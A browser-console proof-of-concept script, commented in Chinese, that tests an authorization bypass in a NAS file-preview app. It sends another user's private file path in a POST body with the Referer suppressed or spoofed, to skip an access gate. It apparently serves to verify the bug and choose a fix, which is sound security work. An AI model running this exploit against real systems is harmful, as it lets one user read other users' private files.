/* ============================================================================
 * POST body 路径绕过 —— 浏览器控制台验证脚本
 * ============================================================================
 *
 * 用法（在浏览器里，不需要终端）：
 *   1. 用**普通用户**（非管理员）登录飞牛，打开任意应用页面（比如本应用的预览页）。
 *      ⚠️ 建议开**无痕窗口**登录普通用户，这样和主窗口的管理员会话互不干扰。
 *   2. F12 → Console → 把本文件**全部内容**粘进去 → 回车。
 *   3. 看输出结论。
 *
 * 前置：把下面 CONFIG 里的两个路径改成你自己的：
 *   PRIVATE = 一个**当前这个普通用户读不到**的文件（比如管理员私有目录里的文件）
 *   PUBLIC  = 一个**当前用户读得到**的文件（做对照，证明 Cookie/链路正常）
 *
 * 怎么找「读不到」的路径：
 *   - 用管理员账号在文件管理器里看某个私有文件的路径；
 *   - 飞牛的文件路径形如 /vol1/@home/<用户名>/... 或 /vol1/<uid>/...
 *   - 填**容器内可见的绝对路径**（就是 /vol 开头那条）。
 *
 * ★ 不想找路径？把 PRIVATE 留空，脚本会自动用「当前 uid ± 1 的 @home 目录」试：
 *   先用 __whoami 拿当前 uid，再拼 /vol1/@home/<uid+1>/probe.docx（大概率不存在，
 *   但**存在与否不影响验证「闸门放行」这一环** —— 我们要看的是闸门给不给过，
 *   而不是文件在不在：403=闸门拦了，200/其它=闸门放行了）。
 * ==========================================================================*/

(async () => {
  // ===== 改这两个（留空 PRIVATE 可自动生成）=====
  let PRIVATE = '';                                     // 当前用户读不到的文件
  const PUBLIC  = '';                                   // 当前用户读得到的文件（可留空）
  // ==============================================

  const P = '/app/basemetas-fileview';
  const base = location.origin;

  const log = (...a) => console.log('%c[探测]', 'color:#0af;font-weight:bold', ...a);
  const ok  = (...a) => console.log('%c✅', 'color:#0a0;font-weight:bold', ...a);
  const bad = (...a) => console.log('%c⚠️', 'color:#e00;font-weight:bold;font-size:14px', ...a);

  log('origin =', base);

  // 拿一下「我是谁」，确认当前会话，并在 PRIVATE 为空时自动拼一个
  let who = '';
  try {
    const w = await fetch(P + '/__whoami', { credentials: 'same-origin' });
    who = (await w.text()).trim();
    log('__whoami →', who);
  } catch (e) {
    log('__whoami 取不到（不影响后续）:', e.message);
  }
  console.log('');

  if (!PRIVATE) {
    // 从 __whoami 里取 uid，拼一个「别人的」家目录路径
    const m = who.match(/uid=(\d+)/);
    const uid = m ? parseInt(m[1], 10) : null;
    if (uid !== null) {
      const other = uid + 1;
      PRIVATE = `/vol1/@home/${other}/probe-not-mine.docx`;
      log('PRIVATE 留空 → 自动生成:', PRIVATE, '（当前 uid=' + uid + '，试 uid=' + other + '）');
    } else {
      PRIVATE = '/vol1/@home/9999/probe-not-mine.docx';
      log('PRIVATE 留空且取不到 uid → 用兜底:', PRIVATE);
    }
    log('⚠️ 自动生成的路径里的文件**可能不存在** —— 不影响验证：');
    log('   我们要看的是闸门「给不给过」（403 / 非 403），不是文件在不在。');
  }
  if (!PUBLIC) log('PUBLIC 留空 —— 跳过 [3] 控制用例（可选）');
  log('PRIVATE =', PRIVATE);
  console.log('');

  const result = { getBlocked: null, postBypass: null, postWithRef: null };

  // ── [1] 对照：GET 带私有路径（正常应被闸门 403）────────────────────────
  try {
    const r = await fetch(
      `${P}/preview/view?path=${encodeURIComponent(PRIVATE)}`,
      { credentials: 'same-origin' }
    );
    result.getBlocked = r.status;
    log('[1] GET /preview/view?path=<私有> →', r.status);
    if (r.status === 403) ok('闸门拦住了 —— 前提成立（闸门生效、会话有效）');
    else if (r.status === 200) bad('没拦住！这个文件当前用户竟然能读？说明 PRIVATE 选错了（应选读不到的）');
    else log('其它状态码:', r.status);
  } catch (e) {
    log('[1] 请求异常:', e.message);
  }
  console.log('');

  // ── [2] ★ 攻击：POST /localFile，body 带私有路径，**不带 Referer** ────
  //     referrerPolicy:'no-referrer' 等价于攻击者用 curl / 关掉 Referer
  try {
    const r = await fetch(`${P}/preview/api/localFile`, {
      method: 'POST',
      credentials: 'same-origin',
      referrerPolicy: 'no-referrer',          // ★ 关键：不发送 Referer
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        srcRelativePath: PRIVATE,
        previewType: 'SERVER_FILE',
        fileName: PRIVATE.split('/').pop(),
      }),
    });
    const text = await r.text();
    result.postBypass = r.status;
    log('[2] POST /preview/api/localFile  body={srcRelativePath:<私有>}  无 Referer');
    log('    → HTTP', r.status);
    log('    响应前 200 字:', text.slice(0, 200));
    if (r.status === 403) ok('403 —— 闸门拦下了，**未绕过**');
    else if (r.status === 200) {
      bad('200 —— **绕过成立**！闸门放行，引擎按 body 里的私有路径处理了请求。');
      bad('（请把上面"响应前 200 字"截图发出来，作为端到端证据）');
    } else log('其它状态码（400/500 等）：需看响应内容判断是「放行后引擎报错」还是「别的原因」');
  } catch (e) {
    log('[2] 请求异常:', e.message);
  }
  console.log('');

  // ── [3] 对照：POST 带**合法 Referer**（模拟正常浏览器流程）─────────────
  //     浏览器**不允许 JS 自定义 Referer 头**，但 referrer 选项可以设成某个 URL
  //     （同源时会被采信）。若设了不生效，这条就跳过 —— 它只是「顺带看」，不影响主结论。
  if (PUBLIC) {
    try {
      const r = await fetch(`${P}/preview/api/localFile`, {
        method: 'POST',
        credentials: 'same-origin',
        referrer: `${base}${P}/preview/view?path=${encodeURIComponent(PUBLIC)}`,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          srcRelativePath: PRIVATE,             // ★ body 仍指向私有文件
          previewType: 'SERVER_FILE',
          fileName: PRIVATE.split('/').pop(),
        }),
      });
      const text = await r.text();
      result.postWithRef = r.status;
      log('[3] POST body=<私有> + Referer=<我能读的文件>（合法 Referer 掩护）');
      log('    → HTTP', r.status);
      log('    响应前 200 字:', text.slice(0, 200));
      if (r.status === 403) ok('403 —— 拦下了（Referer 的路径被计入判定）');
      else if (r.status === 200) bad('200 —— **「合法 Referer 掩护非法 body」也成立**，比无 Referer 更严重');
      else log('其它状态码:', r.status);
    } catch (e) {
      log('[3] 请求异常:', e.message);
    }
  } else {
    log('[3] 已跳过（PUBLIC 留空）');
  }
  console.log('');

  // ── 汇总 ─────────────────────────────────────────────────────────────
  console.log('%c========== 汇总 ==========', 'font-weight:bold');
  console.log('[1] GET 对照      :', result.getBlocked, result.getBlocked === 403 ? '（闸门正常）' : '（异常）');
  console.log('[2] POST 无 Referer:', result.postBypass, result.postBypass === 200 ? '← 绕过成立' : '');
  console.log('[3] POST 合法Referer:', result.postWithRef, result.postWithRef === 200 ? '← 掩护也成立' : '');
  console.log('');
  console.log('把这三行结果 + [2]/[3] 的响应内容发我。');
  console.log('说明：');
  console.log('  [2]=200 → 绕过成立（核心证据）');
  console.log('  [3]=200 → 合法 Referer 也不能兜住，修复必须上「让鉴权层读 body」（方案 B）');
  console.log('  [3]=403 → 可用「fail-closed」收紧（方案 A），但需再确认真机正常流程带 Referer');
})();
